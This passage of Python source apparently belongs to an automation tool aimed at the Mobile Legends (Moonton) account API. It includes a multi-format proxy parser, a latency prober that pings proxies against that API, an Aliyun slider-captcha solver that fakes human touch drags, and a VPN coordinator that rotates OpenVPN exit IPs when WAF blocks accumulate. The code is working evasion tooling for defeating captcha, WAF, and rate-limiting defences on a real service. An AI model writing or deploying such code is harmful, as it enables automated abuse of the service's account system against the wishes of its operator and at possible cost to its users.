async def rotated_user_async(base_user: str, server: str = '', session_id: str = '') -> dict:
    """FIX: Versi async dari rotated_user() dengan lock untuk proteksi race condition."""
    async with _get_rotation_lock():
        return rotated_user(base_user, server, session_id)

# ── General Proxy Parsing (Universal Multi-Format Support) ─────────────────
def parse_proxy(raw: str):
    """Mengembalikan dict proxy untuk Playwright/CloakBrowser.
    Mendukung jenis: HTTP, HTTPS, SOCKS5, SOCKS5H, SOCKS4, SOCKS4A.
    Mendukung format:
      - scheme://[user:pass@]host:port
      - host:port
      - host:port:user:pass (format DataImpulse / Webshare / generic dump)
      - user:pass:host:port
      - user:pass@host:port
      - host:port:user
    Pembersihan otomatis: tab, koma, spasi, kutip, tanda pagar.
    """
    try:
        raw = (raw or '').strip().strip('"').strip("'")
        if not raw or raw.startswith('#'):
            return None
        raw = re.split(r'\s+#', raw, maxsplit=1)[0].strip()
        if not raw:
            return None

        # Bersihkan pemisah tab (jangan hapus spasi dalam password, jangan ubah koma __cr.sg,my)
        raw = raw.replace('\t', ':').strip()
        if ':' not in raw and ',' in raw:
            raw = raw.replace(',', ':')

        scheme = 'http'
        if '://' in raw:
            parts = raw.split('://', 1)
            s_lower = parts[0].lower()
            if s_lower in ('socks5', 'socks5h'):
                scheme = 'socks5'
            elif s_lower in ('socks4', 'socks4a'):
                scheme = 'socks4'
            elif s_lower in ('http', 'https'):
                scheme = s_lower
            else:
                return None
            raw = parts[1]

        user, pwd = None, None
        host, port = None, None

        # Cek format host:port:user:pass tanpa merusak '@' di dalam password (termasuk [ipv6]:port:user:pass)
        pre_c = raw.split(':')
        is_colon_4_host_first = (
            '[' not in raw
            and len(pre_c) >= 4
            and ('.' in pre_c[0] or pre_c[0].lower() == 'localhost')
            and '@' not in pre_c[0]
            and '@' not in pre_c[1]
            and '@' not in pre_c[2]
            and pre_c[1].isdigit()
            and (1 <= int(pre_c[1]) <= 65535)
        )
        if not is_colon_4_host_first and raw.startswith('[') and ']:' in raw:
            _b_end = raw.find(']')
            _r_b = raw[_b_end + 2:].split(':')
            if len(_r_b) >= 3 and _r_b[0].isdigit() and (1 <= int(_r_b[0]) <= 65535) and '@' not in _r_b[0]:
                is_colon_4_host_first = True
        if not is_colon_4_host_first and '@' in raw:
            creds, hostpart = raw.rsplit('@', 1)
            u_p = creds.split(':', 1)
            user = urllib.parse.unquote(u_p[0])
            if len(u_p) > 1:
                pwd = urllib.parse.unquote(u_p[1])
            raw = hostpart.split('/', 1)[0]
        elif '/' in raw and not raw.startswith('['):
            if len(raw.split(':')) <= 3:
                raw = raw.split('/', 1)[0]

        if raw.startswith('['):
            end_b = raw.find(']')
            if end_b == -1:
                return None
            host = raw[1:end_b]
            rest = raw[end_b + 1:]
            if not rest.startswith(':'):
                return None
            rparts = rest[1:].split(':')
            if len(rparts) == 1:
                rparts[0] = rparts[0].split('/', 1)[0]
            if not rparts[0].isdigit():
                return None
            port = int(rparts[0])
            if len(rparts) >= 2 and user is None:
                user = rparts[1]
            if len(rparts) >= 3 and pwd is None:
                pwd = ':'.join(rparts[2:])
        else:
            parts = raw.split(':')
            if len(parts) == 1:
                return None
            elif len(parts) == 2:
                host = parts[0]
                port = int(parts[1].split('/', 1)[0])
            elif len(parts) == 3:
                host = parts[0]
                port = int(parts[1])
                user = parts[2]
            elif len(parts) >= 4:
                p3_clean = parts[3].split('/', 1)[0]
                p3_ok = p3_clean.isdigit() and (1 <= int(p3_clean) <= 65535)
                p1_ok = parts[1].isdigit() and (1 <= int(parts[1]) <= 65535)
                p0_host = ('.' in parts[0] or parts[0].lower() == 'localhost')
                p2_host = ('.' in parts[2] or parts[2].lower() == 'localhost')
                p0_ip = bool(re.fullmatch(r'\d{1,3}(\.\d{1,3}){3}', parts[0]))
                p2_ip = bool(re.fullmatch(r'\d{1,3}(\.\d{1,3}){3}', parts[2]))
                if p3_ok and (not p1_ok or (not p0_host and p2_host) or (p2_ip and not p0_ip)):
                    user = parts[0]
                    pwd = parts[1]
                    host = parts[2]
                    port = int(p3_clean)
                elif p1_ok:
                    host = parts[0]
                    port = int(parts[1])
                    user = parts[2]
                    pwd = ':'.join(parts[3:])
                else:
                    return None

        if not host or not port or not (1 <= port <= 65535):
            return None

        host_fmt = f"[{host}]" if ':' in host else host
        proxy = {"server": f"{scheme}://{host_fmt}:{port}"}
        if user is not None:
            proxy["username"] = user
        if pwd is not None:
            proxy["password"] = pwd
        return proxy
    except Exception:
        return None

def safe_proxy_str(proxy: dict) -> str:
    if not proxy:
        return "<none>"
    srv = proxy.get("server", "")
    usr = proxy.get("username", "")
    if usr:
        if "://" in srv:
            sch, rst = srv.split("://", 1)
            return f"{sch}://{usr}:***@{rst}"
        return f"{usr}:***@{srv}"
    return srv

def load_proxies(path: str) -> list[str]:
    if not os.path.exists(path):
        return []
    out = []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for ln in f:
            ln = ln.strip()
            if ln and not ln.startswith('#'):
                out.append(ln)
    return out

PROXY_API_PROBE_TIMEOUT = 5
MAX_PROXY_PING_MS = 3500

async def _probe_proxy_ms(proxy: dict) -> tuple[bool, str, int]:
    """Uji konektivitas & RTT latency (ms) proxy langsung ke API Moonton."""
    try:
        server = proxy.get('server', '')
        username = proxy.get('username', '')
        password = proxy.get('password', '')

        if username:
            enc_user = urllib.parse.quote(username, safe='')
            enc_pass = urllib.parse.quote(password, safe='') if password else ''
            if '://' in server:
                scheme, rest = server.split('://', 1)
                proxy_url = f"{scheme}://{enc_user}:{enc_pass}@{rest}"
            else:
                proxy_url = f"http://{enc_user}:{enc_pass}@{server}"
        else:
            proxy_url = server if '://' in server else f"http://{server}"

        loop = asyncio.get_running_loop()

        def _recv_exact(sock, n: int) -> bytes:
            buf = bytearray()
            while len(buf) < n:
                chunk = sock.recv(n - len(buf))
                if not chunk:
                    break
                buf.extend(chunk)
            return bytes(buf)

        def _do_check():
            t0 = time.perf_counter()
            if proxy_url.lower().startswith('socks'):
                try:
                    from curl_cffi import requests as _creq
                    r = _creq.head(
                        'https://accountmtapi.mobilelegends.com/',
                        proxies={'http': proxy_url, 'https': proxy_url},
                        timeout=PROXY_API_PROBE_TIMEOUT,
                    )
                    return r.status_code, int((time.perf_counter() - t0) * 1000)
                except ImportError:
                    import socket
                    import ssl
                    creds_part, hp_part = (proxy_url.split('://', 1)[1].rsplit('@', 1) if '@' in proxy_url else ('', proxy_url.split('://', 1)[1]))
                    hp = hp_part.split('/', 1)[0].rsplit(':', 1)
                    with socket.create_connection((hp[0].strip('[]'), int(hp[1])), timeout=PROXY_API_PROBE_TIMEOUT) as s:
                        s.settimeout(PROXY_API_PROBE_TIMEOUT)
                        host_b = b'accountmtapi.mobilelegends.com'
                        u_b = urllib.parse.unquote(creds_part.split(':', 1)[0]).encode()[:255] if creds_part else b''
                        if proxy_url.lower().startswith('socks4'):
                            s.sendall(b'\x04\x01\x01\xbb\x00\x00\x00\x01' + u_b + b'\x00' + host_b + b'\x00')
                            cr = _recv_exact(s, 8)
                            if len(cr) < 2 or cr[1] != 0x5A:
                                raise RuntimeError("Tunnel connection failed")
                        else:
                            p_b = urllib.parse.unquote(creds_part.split(':', 1)[1]).encode()[:255] if ':' in creds_part else b''
                            s.sendall(b'\x05\x02\x00\x02' if u_b else b'\x05\x01\x00')
                            m = _recv_exact(s, 2)
                            if len(m) < 2 or m[0] != 5 or m[1] == 0xFF:
                                raise RuntimeError("SOCKS5 handshake rejected")
                            if m[1] == 2:
                                s.sendall(b'\x01' + bytes([len(u_b)]) + u_b + bytes([len(p_b)]) + p_b)
                                ar = _recv_exact(s, 2)
                                if len(ar) < 2 or ar[1] != 0:
                                    raise RuntimeError("SOCKS5 Auth Failed")
                            s.sendall(b'\x05\x01\x00\x03' + bytes([len(host_b)]) + host_b + b'\x01\xbb')
                            hdr = _recv_exact(s, 4)
                            if len(hdr) < 4 or hdr[1] != 0:
                                raise RuntimeError("Tunnel connection failed")
                            atyp = hdr[3]
                            if atyp == 1:
                                _recv_exact(s, 6)
                            elif atyp == 3:
                                ln_b = _recv_exact(s, 1)
                                _recv_exact(s, (ln_b[0] if ln_b else 0) + 2)
                            elif atyp == 4:
                                _recv_exact(s, 18)
                        ctx_ssl = ssl.create_default_context()
                        with ctx_ssl.wrap_socket(s, server_hostname='accountmtapi.mobilelegends.com') as ss:
                            ss.settimeout(PROXY_API_PROBE_TIMEOUT)
                            ss.sendall(b'HEAD / HTTP/1.1\r\nHost: accountmtapi.mobilelegends.com\r\nConnection: close\r\n\r\n')
                            head_raw = ss.recv(256).decode('ascii', errors='ignore')
                            first_line = head_raw.split('\r\n', 1)[0]
                            parts_h = first_line.split()
                            if len(parts_h) >= 2 and parts_h[0].upper().startswith('HTTP/') and parts_h[1].isdigit():
                                return int(parts_h[1]), int((time.perf_counter() - t0) * 1000)
                        raise RuntimeError("Invalid HTTP response from proxy")
            if proxy_url.lower().startswith('https://'):
                import socket
                import ssl
                creds_part, hp_part = (proxy_url.split('://', 1)[1].rsplit('@', 1) if '@' in proxy_url else ('', proxy_url.split('://', 1)[1]))
                hp = hp_part.split('/', 1)[0].rsplit(':', 1)
                p_host = hp[0].strip('[]')
                ctx_proxy = ssl.create_default_context()
                with socket.create_connection((p_host, int(hp[1])), timeout=PROXY_API_PROBE_TIMEOUT) as raw_s:
                    raw_s.settimeout(PROXY_API_PROBE_TIMEOUT)
                    with ctx_proxy.wrap_socket(raw_s, server_hostname=p_host) as ps:
                        req_hdr = "CONNECT accountmtapi.mobilelegends.com:443 HTTP/1.1\r\nHost: accountmtapi.mobilelegends.com:443\r\n"
                        if creds_part:
                            u_d, _, p_d = creds_part.partition(':')
                            b64 = base64.b64encode(f"{urllib.parse.unquote(u_d)}:{urllib.parse.unquote(p_d)}".encode()).decode()
                            req_hdr += f"Proxy-Authorization: Basic {b64}\r\n"
                        ps.sendall((req_hdr + "\r\n").encode())
                        c_buf = b''
                        while b'\r\n\r\n' not in c_buf and len(c_buf) < 8192:
                            ch = ps.recv(1024)
                            if not ch:
                                break
                            c_buf += ch
                        hdr_bytes, _, extra_bytes = c_buf.partition(b'\r\n\r\n')
                        c_first = hdr_bytes.decode('ascii', errors='ignore').split('\r\n', 1)[0].split()
                        if len(c_first) < 2 or not c_first[1].isdigit():
                            raise RuntimeError("Tunnel connection failed")
                        c_code = int(c_first[1])
                        if c_code != 200:
                            raise RuntimeError("407 TRAFFIC_EXHAUSTED" if c_code == 407 else f"Tunnel connection failed: {c_code}")
                        in_bio, out_bio = ssl.MemoryBIO(), ssl.MemoryBIO()
                        if extra_bytes:
                            in_bio.write(extra_bytes)
                        ssl_obj = ctx_proxy.wrap_bio(in_bio, out_bio, server_hostname='accountmtapi.mobilelegends.com')
                        def _bio_flush():
                            pending = out_bio.read()
                            if pending:
                                ps.sendall(pending)
                        def _bio_step(fn, *a):
                            while True:
                                try:
                                    res = fn(*a)
                                    _bio_flush()
                                    return res
                                except ssl.SSLWantReadError:
                                    _bio_flush()
                                    data = ps.recv(4096)
                                    if not data:
                                        raise RuntimeError("Tunnel TLS EOF")
                                    in_bio.write(data)
                                except ssl.SSLWantWriteError:
                                    _bio_flush()
                        _bio_step(ssl_obj.do_handshake)
                        _bio_step(ssl_obj.write, b'HEAD / HTTP/1.1\r\nHost: accountmtapi.mobilelegends.com\r\nConnection: close\r\n\r\n')
                        head_raw = _bio_step(ssl_obj.read, 512).decode('ascii', errors='ignore')
                        parts_h = head_raw.split('\r\n', 1)[0].split()
                        if len(parts_h) >= 2 and parts_h[0].upper().startswith('HTTP/') and parts_h[1].isdigit():
                            return int(parts_h[1]), int((time.perf_counter() - t0) * 1000)
                raise RuntimeError("Invalid HTTP response from proxy")
            handler = urllib.request.ProxyHandler({'http': proxy_url, 'https': proxy_url})
            opener = urllib.request.build_opener(handler)
            opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
            req = urllib.request.Request('https://accountmtapi.mobilelegends.com/', method='HEAD')
            try:
                with opener.open(req, timeout=PROXY_API_PROBE_TIMEOUT) as resp:
                    code = resp.status if hasattr(resp, 'status') else 200
            except urllib.error.HTTPError as he:
                code = he.code
                try:
                    he.close()
                except Exception:
                    pass
                if code == 407:
                    raise RuntimeError("407 TRAFFIC_EXHAUSTED")
            return code, int((time.perf_counter() - t0) * 1000)

        code, ms = await asyncio.wait_for(
            loop.run_in_executor(None, _do_check),
            timeout=PROXY_API_PROBE_TIMEOUT + 1.5,
        )
        if code == 407:
            return False, "407 TRAFFIC_EXHAUSTED (Kuota habis)", ms
        if code in (400, 402, 403, 429) or code >= 500:
            return False, f"HTTP {code} Proxy Error", ms
        return True, f"OK ({ms}ms)", ms
    except asyncio.TimeoutError:
        return False, "Timeout", 99999
    except Exception as e:
        msg = str(e)
        mlow = msg.lower()
        if any(k in mlow for k in ('407', 'traffic_exhausted', 'unauthorized')):
            return False, "407 TRAFFIC_EXHAUSTED (Kuota DataImpulse habis)", 99999
        elif 'socks5 auth failed' in mlow:
            return False, "SOCKS5 Auth Failed", 99999
        elif any(k in mlow for k in ('tunnel', 'connection refused', 'connection reset')):
            m_code = re.search(r'\b(402|403|429|50[0-9])\b', msg)
            return False, (f"HTTP {m_code.group(1)} Proxy Error" if m_code else "Tunnel connection failed"), 99999
        elif 'timed out' in mlow or 'timeout' in mlow:
            return False, "Timeout", 99999
        return False, msg[:45], 99999

async def test_proxy(proxy: dict, browser=None) -> tuple[bool, str]:
    ok, reason, _ = await _probe_proxy_ms(proxy)
    return ok, reason

async def test_proxies(raw_proxies, browser=None, concurrency=16):
    """Uji ping proxy langsung ke API Moonton, buang yang mati/latency abnormal, dan urutkan tercepat."""
    parsed = [(r, parse_proxy(r)) for r in raw_proxies]
    valid_entries = [(idx, raw, p) for idx, (raw, p) in enumerate(parsed, 1) if p]
    for idx, (raw, p) in enumerate(parsed, 1):
        if not p:
            p_out(f" {c(RED)}[BAD ]{W} [{idx:>3}/{len(parsed)}] {raw} -> invalid format")
    if not valid_entries:
        return []

    sem = asyncio.Semaphore(concurrency)
    probe_targets = valid_entries

    async def _run_probe(idx, raw, p):
        async with sem:
            ok, reason, ms = await _probe_proxy_ms(p)
            return idx, raw, p, ok, reason, ms

    results = await asyncio.gather(*(_run_probe(i, r, p) for i, r, p in probe_targets))

    live = []
    for idx, raw, p, ok, reason, ms in results:
        if ok and ms <= MAX_PROXY_PING_MS:
            live.append((ms, idx, raw, p))
        else:
            why = f"Slow {ms}ms > {MAX_PROXY_PING_MS}ms" if ok else reason
            p_out(f" {c(RED)}[DROP]{W} [{idx:>3}/{len(parsed)}] {safe_proxy_str(p)} -> {c(GOLD)}{why}{W}")

    if not live:
        return []

    live.sort(key=lambda x: x[0])
    lat_sorted = [x[0] for x in live]
    median_ms = lat_sorted[len(lat_sorted) // 2]
    cutoff_ms = min(MAX_PROXY_PING_MS, max(1500, int(median_ms * 1.6)))

    fast = [x for x in live if x[0] <= cutoff_ms]
    if len(fast) < min(10, len(live)):
        fast = live[:min(10, len(live))]
    for ms, idx, raw, p in live[len(fast):]:
        p_out(f" {c(GOLD)}[SLOW]{W} [{idx:>3}/{len(parsed)}] {safe_proxy_str(p)} -> {ms}ms > {cutoff_ms}ms (dibuang)")

    # Perbarui DATAIMPULSE_REGIONS hanya dengan max 12 negara tercepat hasil ping ke API Moonton
    fast_ccs = []
    for ms, _, _, p in fast:
        usr = p.get('username') or ''
        if '__cr.' in usr:
            for seg in usr.split('__'):
                if seg.startswith('cr.'):
                    for raw_cc in seg[3:].split(','):
                        cc = raw_cc.strip().lower()
                        if cc and cc not in _TUNNEL_BLACKLIST and cc not in fast_ccs:
                            fast_ccs.append(cc)
                            if len(fast_ccs) >= 12:
                                break
                if len(fast_ccs) >= 12:
                    break
        if len(fast_ccs) >= 12:
            break
    if len(fast_ccs) >= 4:
        DATAIMPULSE_REGIONS[:] = fast_ccs
    elif len(fast_ccs) >= 1:
        merged_ccs = fast_ccs + [r for r in DATAIMPULSE_REGIONS if r not in fast_ccs and r not in _TUNNEL_BLACKLIST]
        DATAIMPULSE_REGIONS[:] = merged_ccs

    good = [(raw, p) for _, _, raw, p in fast]
    p_out(
        f" {c(GREEN)}[ OK ]{W} {len(good)}/{len(probe_targets)} proxy lolos filter ping API "
        f"(best: {fast[0][0]}ms, median: {median_ms}ms, cutoff: {cutoff_ms}ms)"
    )
    return good

# ── Aliyun Captcha Slider Solver (CDP Touch - proxy.py 1:1) ─────────────────
async def _touch(cdp, etype, x, y, keep=False):
    pts = [] if keep else [{"x": float(x), "y": float(y), "radiusX": 6, "radiusY": 6, "force": 1, "id": 1}]
    await cdp.send("Input.dispatchTouchEvent", {"type": etype, "touchPoints": pts})

async def _human_drag(page, ctx, sx, sy, dist):
    try:
        # ponytail: reuse single CDP session per page so 1000+ slider solves don't leak zombie CDP sessions
        cdp = getattr(page, '_touch_cdp', None)
        if cdp is None:
            cdp = await ctx.new_cdp_session(page)
            page._touch_cdp = cdp
        R = lambda a, b: a + random.random() * (b - a)
        pts = []
        x = 0.0
        ae = dist * R(0.28, 0.40)
        for i in range(2 + int(random.random() * 2)):
            x += R(3, 7) * (1 + i * 0.6)
            if x > ae:
                x = ae
                break
            pts.append({"x": x, "d": R(12, 25)})
        nf = 4 + int(random.random() * 4)
        rem = dist - x
        for i in range(nf):
            step = rem / (nf - i) * R(0.8, 1.2)
            if x + step >= dist - 1 or (step < 4 and i > 0):
                break
            x += max(step, 2.0)
            pts.append({"x": x, "d": R(4, 9)})
        if not pts or x < dist * 0.72:
            pts.append({"x": max(x + 2.0, dist * 0.78), "d": R(7, 13)})
        pts.append({"x": dist + R(1.5, 4), "d": R(12, 22)})
        pts.append({"x": dist + R(-1, 1), "d": R(10, 18)})
        pts.append({"x": dist, "d": R(5, 10)})

        await _touch(cdp, "touchStart", sx, sy)
        await asyncio.sleep(R(15, 30) / 1000)
        for p in pts:
            prog = min(p["x"] / dist, 1.0) if dist > 0 else 0
            wb = 2.6 * math.sin(math.pi * prog)
            dy = wb * 0.3 if p["x"] >= dist else wb * R(0.55, 1.0)
            await _touch(cdp, "touchMove", sx + p["x"], sy + dy + R(-0.4, 0.4))
            await asyncio.sleep(p["d"] / 1000)
        await _touch(cdp, "touchEnd", sx + dist, sy, keep=True)
        return True
    except BaseException as e:
        old_cdp = getattr(page, '_touch_cdp', None)
        page._touch_cdp = None
        if old_cdp is not None:
            try:
                await old_cdp.detach()
            except Exception:
                pass
        if isinstance(e, (asyncio.CancelledError, KeyboardInterrupt, SystemExit)):
            raise
        dbg(f"drag err: {e}")
        return False

async def solve_waf(page, ctx) -> bool:
    t0 = time.monotonic()
    try:
        return await _solve_waf_impl(page, ctx)
    finally:
        _PERF.record_stall('waf', time.monotonic() - t0)

_SLIDER_BOX_JS = """() => {
    const v = el => {
        if (!el) return false;
        const r = el.getBoundingClientRect();
        if (r.width <= 0 || r.height <= 0) return false;
        const cs = getComputedStyle(el);
        return cs.display !== 'none' && cs.visibility !== 'hidden' && parseFloat(cs.opacity || '1') > 0;
    };
    const s = document.getElementById('aliyunCaptcha-sliding-slider')
           || document.querySelector('.btn_slide')
           || document.querySelector('[id*="sliding-slider"]')
           || document.querySelector('[class*="btn_slide"]');
    if (!v(s)) return null;
    try { s.scrollIntoView({ block: 'center', inline: 'center', behavior: 'instant' }); } catch(_) {}
    const r = s.getBoundingClientRect();
    if (r.width <= 0 || r.height <= 0) return null;
    const track = document.getElementById('aliyunCaptcha-sliding-body')
               || document.querySelector('.nc_scale')
               || document.querySelector('[id*="sliding-body"]')
               || s.closest('#WAF_NC_WRAPPER')
               || s.parentElement;
    const tr = track ? track.getBoundingClientRect() : r;
    const inner = (track && track.clientWidth) ? track.clientWidth : tr.width;
    const sw = s.offsetWidth || r.width;
    const rawMt = Math.ceil(inner - sw);
    return { x: r.x, y: r.y, w: r.width, h: r.height, mt: rawMt > 20 ? rawMt : 185 };
}"""

_SLIDER_VISIBLE_JS = """() => {
    const v = el => {
        if (!el) return false;
        const r = el.getBoundingClientRect();
        if (r.width <= 0 || r.height <= 0) return false;
        const cs = getComputedStyle(el);
        return cs.display !== 'none' && cs.visibility !== 'hidden' && parseFloat(cs.opacity || '1') > 0;
    };
    const els = [
        document.getElementById('waf_nc_block'),
        document.getElementById('WAF_NC_WRAPPER'),
        document.getElementById('aliyunCaptcha-sliding-slider'),
        document.querySelector('.btn_slide'),
        document.querySelector('[id*="sliding-slider"]'),
        document.querySelector('[class*="btn_slide"]'),
        document.querySelector('.nc_scale'),
    ];
    return els.some(v);
}"""

async def _solve_waf_impl(page, ctx) -> bool:
    has = False
    try:
        has = await page.evaluate(_SLIDER_VISIBLE_JS)
    except Exception:
        return False
    if not has:
        return True

    box = None
    for _ in range(25):  # hingga 5.0s tunggu slider Aliyun ter-mount
        try:
            box = await page.evaluate(_SLIDER_BOX_JS)
        except Exception:
            box = None
        if box:
            break
        await asyncio.sleep(0.2)
    if not box:
        return False

    # Coba hingga 2x dengan re-measure box agar cepat fail-over saat IP kotor
    for mult in (1.0, 0.96):
        if mult != 1.0:
            try:
                box = await page.evaluate(_SLIDER_BOX_JS) or box
            except Exception:
                pass
        sx = box["x"] + box["w"] / 2
        sy = box["y"] + box["h"] / 2
        variant_dist = int(box.get("mt", 185) * mult)
        if not await _human_drag(page, ctx, sx, sy, variant_dist):
            continue
        still = True
        for _ in range(10):
            await asyncio.sleep(0.1)
            try:
                still = await page.evaluate(_SLIDER_VISIBLE_JS)
            except Exception as ex:
                if 'execution context was destroyed' in str(ex).lower():
                    await asyncio.sleep(0.3)
                    try:
                        still = await page.evaluate(_SLIDER_VISIBLE_JS)
                        if not still:
                            break
                    except Exception:
                        pass
                still = True
                break
            if not still:
                break
        if not still:
            stats['waf_solved'] += 1
            if not _TUI_ACTIVE:
                clear_line()
                p_out(f"  {c(GREEN)}→ slider solved ✓{W}")
            print_progress()
            return True

    if not _TUI_ACTIVE:
        clear_line()
        p_out(f"  {c(GOLD)}→ slider failed (still visible){W}")
    print_progress()
    return False

async def fetch_public_ip(timeout_s: float = 3.0) -> str:
    """Ambil public exit IP lewat VPN aktif (validasi IPv4/IPv6 murni stdlib)."""
    import ipaddress
    endpoints = (
        'https://api.ipify.org',
        'https://ifconfig.me/ip',
        'https://1.1.1.1/cdn-cgi/trace',
    )
    loop = asyncio.get_running_loop()
    def _probe() -> str:
        for url in endpoints:
            try:
                req = urllib.request.Request(url, headers={'User-Agent': 'curl/8.0'})
                with urllib.request.urlopen(req, timeout=timeout_s) as r:
                    txt = r.read(512).decode('utf-8', errors='ignore').strip()
                if 'ip=' in txt:
                    for ln in txt.splitlines():
                        if ln.startswith('ip='):
                            txt = ln[3:].strip()
                            break
                txt = txt.splitlines()[0].strip() if txt else ''
                ipaddress.ip_address(txt)
                return txt
            except Exception:
                continue
        return 'unknown'
    try:
        return await asyncio.wait_for(loop.run_in_executor(None, _probe), timeout=timeout_s * 3.0 + 2.0)
    except Exception:
        return 'unknown'

def _find_warp_cli() -> str | None:
    cands = [
        shutil.which('warp-cli') or '',
        r'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe',
    ]
    for p in cands:
        if p and os.path.isfile(p):
            return p
    return None

def _find_openvpn_bin() -> str | None:
    cands = [
        shutil.which('openvpn') or '',
        r'C:\Program Files\OpenVPN\bin\openvpn.exe',
        r'C:\Program Files (x86)\OpenVPN\bin\openvpn.exe',
        '/usr/sbin/openvpn',
        '/usr/bin/openvpn',
        '/data/data/com.termux/files/usr/bin/openvpn',
    ]
    for p in cands:
        if p and os.path.isfile(p):
            return p
    return None

async def _probe_direct_moonton_ms(timeout_s: float = 6.0) -> tuple[bool, str, int]:
    """Uji konektivitas internet + latensi API Moonton lewat interface jaringan/VPN aktif."""
    loop = asyncio.get_running_loop()
    def _do():
        t0 = time.perf_counter()
        req = urllib.request.Request(
            'https://accountmtapi.mobilelegends.com/',
            method='HEAD',
            headers={'User-Agent': 'Mozilla/5.0'},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout_s) as resp:
                code = resp.status if hasattr(resp, 'status') else 200
        except urllib.error.HTTPError as he:
            code = he.code
            try:
                he.close()
            except Exception:
                pass
        return code, int((time.perf_counter() - t0) * 1000)
    try:
        code, ms = await asyncio.wait_for(loop.run_in_executor(None, _do), timeout=timeout_s + 1.5)
        if code == 405:
            return False, f"HTTP 405 WAF Block ({ms}ms)", ms
        if code in (400, 402, 403, 407, 429) or code >= 500:
            return False, f"HTTP {code} Error", ms
        if ms > MAX_PROXY_PING_MS:
            return False, f"Slow {ms}ms > {MAX_PROXY_PING_MS}ms", ms
        return True, f"OK ({ms}ms)", ms
    except asyncio.TimeoutError:
        return False, "Timeout (no internet / blocked)", 99999
    except Exception as e:
        return False, str(e)[:48] or "Connection failed", 99999

class VpnCoordinator:
    """Koordinasi VPN shared exit-IP antar worker (cooldown / --vpn-cmd / --vpn-wait / --vpn-ovpn-dir)."""
    def __init__(self, vpn_cmd: str = '', vpn_wait: bool = False, waf_threshold: int = 5,
                 waf_cooldown: float = 25.0, rotate_every: int = 0, ip_check: bool = True,
                 current_ip: str = 'unknown', ovpn_dir: str = '', ovpn_auth: str = ''):
        self.vpn_cmd = (vpn_cmd or '').strip()
        self.vpn_wait = bool(vpn_wait)
        self.waf_threshold = max(1, int(waf_threshold))
        self.waf_cooldown = max(3.0, float(waf_cooldown))
        self.rotate_every = max(0, int(rotate_every))
        self.ip_check = bool(ip_check)
        self.current_ip = current_ip or 'unknown'
        self.ovpn_dir = (ovpn_dir or '').strip()
        self.ovpn_auth = (ovpn_auth or '').strip()
        self.ovpn_bin = None
        self.ovpn_files: list[str] = []
        self.ovpn_idx = 0
        self.cur_ovpn_cfg = ''
        self.ovpn_penalties: dict[str, int] = {}
        self.ovpn_cooldown_until: dict[str, float] = {}
        self.node_scores: dict[str, dict] = {}
        self._ovpn_proc = None
        self._ovpn_mgmt_port = 0
        self.ovpn_disable_dco = False
        self.ovpn_ignore_dns_block = False
        self.ovpn_started = False
        self.ovpn_failed = False
        self._linux_ssh_preserved = False
        if self.ovpn_dir:
            d_abs = os.path.abspath(self.ovpn_dir)
            if not os.path.isdir(d_abs) and not os.path.isabs(self.ovpn_dir):
                cand_base = os.path.join(BASE, self.ovpn_dir)
                if os.path.isdir(cand_base):
                    d_abs = os.path.abspath(cand_base)
            if not os.path.isdir(d_abs):
                raise RuntimeError(f"Folder .ovpn tidak ditemukan: {d_abs}")
            self.ovpn_dir = d_abs
            self.ovpn_files = sorted(
                os.path.join(d_abs, f) for f in os.listdir(d_abs)
                if f.lower().endswith('.ovpn') and os.path.isfile(os.path.join(d_abs, f))
            )
            if not self.ovpn_files:
                raise RuntimeError(f"Tidak ada file *.ovpn di folder: {d_abs}")
            self.ovpn_bin = _find_openvpn_bin()
            if not self.ovpn_bin:
                raise RuntimeError("Binary openvpn tidak ditemukan. Install OpenVPN dulu.")
            if not self.ovpn_auth:
                for cand in ('auth.txt', 'pass.txt', 'credentials.txt'):
                    cp = os.path.join(d_abs, cand)
                    if os.path.isfile(cp):
                        self.ovpn_auth = cp
                        break
            elif not os.path.isfile(self.ovpn_auth):
                raise RuntimeError(f"File auth OpenVPN tidak ditemukan: {self.ovpn_auth}")
        self.consec_waf_rate = 0
        self._recent_outcomes: deque[bool] = deque(maxlen=18)
        self.epoch = 0
        self.last_rotate_checked = 0
        self.rotations = 0
        self.rotating = False
        self.lock = asyncio.Lock()
        self.gate = asyncio.Event()
        self.gate.set()
        if self.ovpn_dir:
            self.node_scores = self._load_node_scores()

    @staticmethod
    def _parse_linux_default_route(route_out: str) -> tuple[str, str]:
        """Ekstrak (dev, gw) rute default non-tunnel Linux untuk policy routing anti putus SSH."""
        for ln in (route_out or '').splitlines():
            parts = ln.split()
            if not parts or parts[0] != 'default':
                continue
            dev = parts[parts.index('dev') + 1] if 'dev' in parts and parts.index('dev') + 1 < len(parts) else ''
            gw = parts[parts.index('via') + 1] if 'via' in parts and parts.index('via') + 1 < len(parts) else ''
            if dev and not dev.startswith(('tun', 'tap')):
                return dev, gw
        return '', ''

    async def _preserve_linux_vps_routes(self):
        """Pasang policy routing (table 100) agar SSH/incoming ke IP asli VPS tetap hidup saat OpenVPN mengubah default route."""
        if os.name == 'nt' or not sys.platform.startswith('linux') or _PLAT['is_android'] or self._linux_ssh_preserved:
            return
        if hasattr(os, 'geteuid') and os.geteuid() != 0:
            return
        ip_bin = shutil.which('ip') or ('/sbin/ip' if os.path.isfile('/sbin/ip') else '/usr/sbin/ip')
        if not ip_bin or not os.path.isfile(ip_bin):
            return
        self._linux_ssh_preserved = True

        async def _run_ip(*args: str) -> tuple[int, str]:
            proc = await asyncio.create_subprocess_exec(
                ip_bin, *args,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            out_b, _ = await asyncio.wait_for(proc.communicate(), timeout=4.0)
            return proc.returncode, (out_b or b'').decode('utf-8', errors='ignore')

        try:
            rc, rt_out = await _run_ip('-4', 'route', 'show', 'default')
            if rc != 0:
                return
            dev, gw = self._parse_linux_default_route(rt_out)
            if not dev:
                return
            rc_a, addr_out = await _run_ip('-4', '-o', 'addr', 'show', 'dev', dev, 'scope', 'global')
            if rc_a != 0:
                return
            ips = []
            for ln in addr_out.splitlines():
                m = re.search(r'\binet\s+(\d+\.\d+\.\d+\.\d+)/', ln)
                if m and m.group(1) not in ips:
                    ips.append(m.group(1))
            if not ips:
                return
            await _run_ip('route', 'flush', 'table', '100')
            _, link_out = await _run_ip('-4', 'route', 'show', 'dev', dev, 'scope', 'link')
            for ln in link_out.splitlines():
                net_dst = ln.split()[0] if ln.split() else ''
                if net_dst and net_dst != 'default':
